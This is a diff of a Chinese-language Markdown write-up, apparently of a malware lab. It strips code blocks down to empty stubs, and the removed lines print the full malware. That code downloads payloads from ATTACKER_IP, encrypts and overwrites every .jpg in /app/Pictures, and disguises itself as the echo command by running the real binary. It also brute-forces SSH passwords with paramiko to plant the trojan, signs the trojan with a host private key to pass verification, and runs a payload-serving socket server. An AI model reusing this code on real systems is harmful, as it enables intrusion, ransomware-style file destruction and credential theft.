@@ -106,43 +106,7 @@ int download_file(const char *request, const char *output_path) {
 
 ##### 檔案下載功能
 ```c
-int download_file(const char *request, const char *output_path) {
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) {
-        perror("socket");
-        return -1;
-    }
-
-    struct sockaddr_in server;
-    server.sin_family = AF_INET;
-    server.sin_port = htons(ATTACKER_PORT);
-    inet_pton(AF_INET, ATTACKER_IP, &server.sin_addr);
-
-    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
-        perror("connect");
-        close(sock);
-        return -1;
-    }
-
-    send(sock, request, strlen(request), 0);
-
-    FILE *fp = fopen(output_path, "wb");
-    if (!fp) {
-        perror("fopen");
-        close(sock);
-        return -1;
-    }
-
-    char buffer[BUFFER_SIZE];
-    ssize_t bytes;
-    while ((bytes = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
-        fwrite(buffer, 1, bytes, fp);
-    }
-
-    fclose(fp);
-    close(sock);
-    return 0;
-}
+int download_file(const char *request, const char *output_path) { }
 ```
 
 **功能說明**:
@@ -152,43 +116,7 @@ int download_file(const char *request, const char *output_path) {
 
 ##### 檔案加密功能
 ```c
-void encrypt_jpgs_in_app_pictures() {
-    const char *dir_path = "/app/Pictures/";
-    DIR *dir = opendir(dir_path);
-    struct dirent *entry;
-
-    if (!dir) {
-        perror("Failed to open /app/Pictures/");
-        return;
-    }
-
-    while ((entry = readdir(dir)) != NULL) {
-        if (entry->d_type == DT_REG) {
-            const char *filename = entry->d_name;
-            size_t len = strlen(filename);
-
-            // Check if filename ends with .jpg
-            if (len > 4 && strcmp(filename + len - 4, ".jpg") == 0) {
-                char input_path[512];
-                char temp_output_path[512];
-                char cmd[1024];
-
-                snprintf(input_path, sizeof(input_path), "%s%s", dir_path, filename);
-                snprintf(temp_output_path, sizeof(temp_output_path), "%s%s.tmp", dir_path, filename);
-                snprintf(cmd, sizeof(cmd), "/tmp/aes-tool enc \"%s\" \"%s\"", input_path, temp_output_path);
-
-                // 執行加密
-                system(cmd);
-
-                // 刪除原始檔
-                remove(input_path);
-                rename(temp_output_path, input_path); // 把 temp 改回原本檔名
-            }
-        }
-    }
-
-    closedir(dir);
-}
+void encrypt_jpgs_in_app_pictures() { }
 ```
 
 **功能說明**:
@@ -199,52 +127,7 @@ void encrypt_jpgs_in_app_pictures() {
 
 ##### 偽裝執行功能
 ```c
-void restore_and_execute_echo(int argc, char *argv[]) {
-    const char *gz_path = "echo.gz";
-    const char *echo_path = "orin_echo";
-
-    // 寫入 echo.gz
-    FILE *fp = fopen(gz_path, "wb");
-    if (!fp) {
-        perror("fopen gzip");
-        return;
-    }
-    fwrite(echo_gz, 1, echo_gz_len, fp);
-    fclose(fp);
-
-    // 解壓縮成 echo 可執行檔
-    char cmd[256];
-    snprintf(cmd, sizeof(cmd), "gzip -d -c %s > %s", gz_path, echo_path);
-    if (system(cmd) != 0) {
-        fprintf(stderr, "❌ 解壓縮 echo.gz 失敗\n");
-        return;
-    }
-
-    // 設定可執行權限
-    chmod(echo_path, 0755);
-
-    // 準備參數（argv[0] 為 "echo"，argv[1...] 是原始參數）
-    char *exec_args[argc + 1];
-    exec_args[0] = "echo";
-    for (int i = 1; i < argc; ++i) {
-        exec_args[i] = argv[i];
-    }
-    exec_args[argc] = NULL;
-
-    // fork + execv
-    pid_t pid = fork();
-    if (pid == 0) {
-        execv(echo_path, exec_args);
-        perror("execv");
-        exit(1);
-    } else if (pid > 0) {
-        waitpid(pid, NULL, 0);
-    } else {
-        perror("fork");
-    }
-    remove(gz_path);
-    remove(echo_path);
-}
+void restore_and_execute_echo(int argc, char *argv[]) { }
 ```
 
 **功能說明**:
@@ -288,31 +171,7 @@ for i in range(1, len(words) + 1):
 
 ##### SSH 連線嘗試
 ```python
-def try_ssh(password, retries=3):
-    for attempt in range(retries):
-        try:
-            client = paramiko.SSHClient()
-            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(victim_ip, username=username, password=password, timeout=2)
-
-            print(f"✔ 成功登入！密碼是：{password}")
-
-            push_echo(client)
-
-            client.close()
-            exit(0)  # 找到密碼後立即退出
-        
-        except paramiko.ssh_exception.AuthenticationException:
-            print(f"❌ 密碼錯誤，跳過密碼：{password}")
-            return  # 密碼錯誤，直接跳過，不重試
-        
-        except (paramiko.ssh_exception.SSHException, EOFError):
-            print(f"⚠ SSH 連線錯誤，重試（{attempt+1}/{retries}）...")
-            time.sleep(1)  # 短暫等待後重試
-        
-        except Exception as e:
-            print(f"⚠ 未知錯誤：{e}")
-            return  # 如果是未知錯誤，就直接跳過
+def try_ssh(password, retries=3): 
 ```
 
 **功能說明**:
@@ -323,21 +182,11 @@ def try_ssh(password, retries=3):
 ##### 惡意軟體準備
 ```python
 def prepare_echo(attacker_ip, attacker_port):
-    private_key_path = "/app/certs/host.key"
-
     # 複製 echo 並壓縮、轉換成 C 可以處理的數據
-    subprocess.run(["cp", "/usr/bin/echo", "orin_echo"], check=True)
-    subprocess.run("gzip -c orin_echo > echo.gz", shell=True, check=True)
-    subprocess.run("xxd -i echo.gz > echo_gz.h", shell=True, check=True)
 
     # 編譯 echo.c
-    compile_cmd = f"gcc -o echo echo.c -DATTACKER_IP='\"{attacker_ip}\"' -DATTACKER_PORT={attacker_port}"
-    subprocess.run(compile_cmd, shell=True, check=True)
 
     # 調整大小、附上簽名
-    subprocess.run("truncate -s $((35208 - 512)) echo", shell=True, check=True)
-    subprocess.run(f"openssl dgst -sha3-512 -sign {private_key_path} -out signature echo", shell=True, check=True)
-    subprocess.run("tail -c 512 signature >> echo", shell=True, check=True)
 ```
 
 **功能說明**:
@@ -363,24 +212,6 @@ files = {
 }
 
 def start_server():
-    print(f"🔥 攻擊伺服器啟動中 ({HOST}:{PORT})...")
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((HOST, PORT))
-    server.listen(5)
-
-    while True:
-        conn, addr = server.accept()
-        print(f"⚡ 來自 {addr} 的請求")
-        request = conn.recv(1024).decode().strip()
-
-        if request in files:
-            with open(files[request], "rb") as file:
-                conn.sendall(file.read())  # 傳送所需的文件
-            print(f"📤 傳送 {request} 給 {addr}")
-        else:
-            conn.sendall(b"ERROR: File not found")
-
-        conn.close()
 ```
 
 **功能說明**:
